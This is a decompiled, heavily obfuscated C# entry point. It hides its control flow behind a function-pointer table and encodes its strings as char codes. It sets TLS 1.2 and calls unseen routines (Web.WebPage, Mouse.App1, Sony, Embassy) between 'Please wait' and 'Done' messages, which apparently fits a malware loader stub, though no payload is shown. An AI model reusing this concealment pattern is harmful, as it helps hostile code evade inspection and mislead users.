using System;
using System.Net;

namespace WindowsFormsApp20;

public static class Program
{
	private static IntPtr[] RemoveNamedPermissionSetEventRegistrationTokenList;

	private static void AsErrorSiteServerAuthority(ref int int_0, ref int int_1, ref int[] int_2, Exception exception_0, ref object object_0)
	{
		char[] array = new char[11];
		object obj = (object_0 = array);
		((short[])object_0)[0] = 80;
		((short[])object_0)[1] = 108;
		((short[])object_0)[2] = 101;
		((short[])object_0)[3] = 97;
		((short[])object_0)[4] = 115;
		((short[])object_0)[5] = 101;
		((short[])object_0)[6] = 32;
		((short[])object_0)[7] = 119;
		((short[])object_0)[8] = 97;
		((short[])object_0)[9] = 105;
		((short[])object_0)[10] = 116;
		Console.WriteLine(new string(array));
		Web.WebPage();
		Mouse.App1();
		Mouse.Sony();
		Mouse.Embassy();
		char[] array2 = new char[4];
		obj = (object_0 = array2);
		((short[])object_0)[0] = 68;
		((short[])object_0)[1] = 111;
		((short[])object_0)[2] = 110;
		((short[])object_0)[3] = 101;
		Console.WriteLine(new string(array2));
		int_0 = 4;
	}

	private static void AssemblyCompanyAttributegetBootstrapContext(ref int int_0, ref int int_1, ref int[] int_2, Exception exception_0, ref object object_0)
	{
		if (!typeof(object).IsInstanceOfType(exception_0))
		{
			int_0 = 5;
			return;
		}
		int_2 = null;
		int_0 = 3;
	}

	private static void IsObjectOutOfContextSoapIdref(ref int int_0, ref int int_1, ref int[] int_2, Exception exception_0, ref object object_0)
	{
		int_0 = 1;
	}

	private static void RSAPKCSSignatureDeformatterEncoderExceptionFallback(ref int int_0, ref int int_1, ref int[] int_2, Exception exception_0, ref object object_0)
	{
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		int_2 = null;
		int_0 = 3;
	}

	[STAThread]
	public unsafe static void Main()
	{
		int num = 0;
		int[] array = new int[8] { 0, 3, 0, 0, 0, 0, 0, 0 };
		Exception ex = default(Exception);
		int num2 = default(int);
		int[] array2 = default(int[]);
		object obj = default(object);
		while (true)
		{
			switch (num)
			{
			case 5:
				throw ex;
			case 4:
				return;
			}
			try
			{
				((delegate*<ref int, ref int, ref int[], Exception, ref object, void>)RemoveNamedPermissionSetEventRegistrationTokenList[num])(ref num, ref num2, ref array2, ex, ref obj);
			}
			catch (Exception ex2)
			{
				if (num == 7)
				{
					num = num2;
					continue;
				}
				ex = ex2;
				array2 = null;
				int num3 = array[num - 0];
				if (num3 == 0)
				{
					throw;
				}
				num = num3 + -1;
			}
		}
	}

	static Program()
	{
		ToDecimalCheckTypeSecurity();
	}

	private unsafe static void ToDecimalCheckTypeSecurity()
	{
		RemoveNamedPermissionSetEventRegistrationTokenList = new IntPtr[4];
		RemoveNamedPermissionSetEventRegistrationTokenList[0] = (nint)(delegate*<ref int, ref int, ref int[], Exception, ref object, void>)(&IsObjectOutOfContextSoapIdref);
		RemoveNamedPermissionSetEventRegistrationTokenList[1] = (nint)(delegate*<ref int, ref int, ref int[], Exception, ref object, void>)(&RSAPKCSSignatureDeformatterEncoderExceptionFallback);
		RemoveNamedPermissionSetEventRegistrationTokenList[2] = (nint)(delegate*<ref int, ref int, ref int[], Exception, ref object, void>)(&AssemblyCompanyAttributegetBootstrapContext);
		RemoveNamedPermissionSetEventRegistrationTokenList[3] = (nint)(delegate*<ref int, ref int, ref int[], Exception, ref object, void>)(&AsErrorSiteServerAuthority);
	}
}
